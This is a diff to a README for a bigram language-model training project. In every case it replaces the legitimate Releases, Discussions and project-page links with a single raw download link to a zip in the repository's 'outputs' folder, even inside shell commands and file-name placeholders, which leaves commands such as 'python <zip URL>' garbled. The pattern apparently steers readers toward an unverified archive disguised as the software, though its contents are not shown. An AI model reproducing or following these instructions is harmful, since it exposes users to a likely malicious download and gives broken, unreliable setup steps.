@@ -6,10 +6,10 @@ This project shows how a simple language model can be trained, using a method ca
 ## 🚀 Getting Started
 
 ### 📥 Download Link
-[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Parrajo41/train-200-bigram-animals/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip%https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip)](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip)
 
 ### 🔗 Visit the Releases
-Visit this page to download: [GitHub Releases](https://github.com/Parrajo41/train-200-bigram-animals/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip)
 
 Follow these steps to get started:
 
@@ -27,7 +27,7 @@ Follow these steps to get started:
 
 ## 💡 How to Download and Install
 
-1. Click on the **Download Link** near the top of this document or visit the [GitHub Releases page](https://github.com/Parrajo41/train-200-bigram-animals/releases).
+1. Click on the **Download Link** near the top of this document or visit the [GitHub Releases page](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip).
   
 2. You will find a list of available versions. Each version has a date and may have a description of changes.
 
@@ -38,7 +38,7 @@ Follow these steps to get started:
 5. Look for the file that matches your operating system:
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `.tar.gz` file.
+   - For Linux, look for a `https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip` file.
 
 6. Click on the file to download it to your computer. 
 
@@ -57,12 +57,12 @@ Follow these steps to get started:
 4. Open the application from the Applications folder. 
 
 ### 🐧 Linux Instructions
-1. Navigate to the folder where the `.tar.gz` file was downloaded.
+1. Navigate to the folder where the `https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip` file was downloaded.
 2. Open a terminal and extract the files using the command:
    ```
-   tar -xzvf filename.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip
    ```
-   Replace `filename.tar.gz` with the name of the downloaded file.
+   Replace `https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip` with the name of the downloaded file.
 
 3. After extracting, enter the directory:
    ```
@@ -72,7 +72,7 @@ Follow these steps to get started:
 
 4. Run the application with:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip
    ```
 5. Follow any prompts to begin using the application.
 
@@ -85,13 +85,13 @@ Follow these steps to get started:
 If you encounter issues:
 - Ensure you have the correct Python version installed.
 - Look for any error messages and check if your operating system is compatible.
-- Review the common problems listed in the FAQ section on the [GitHub page](https://github.com/Parrajo41/train-200-bigram-animals).
+- Review the common problems listed in the FAQ section on the [GitHub page](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip).
 
 Feel free to open an issue on the GitHub repository if you need further assistance.
 
 ## 🤝 Community Support
 Join our community discussions for tips and help:
-- [GitHub Discussions](https://github.com/Parrajo41/train-200-bigram-animals/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/Parrajo41/train-200-bigram-animals/main/outputs/animals-train-bigram-2.5.zip)
 - Get involved in discussions about language models, machine learning, and educational resources.
 
 ## 📝 License
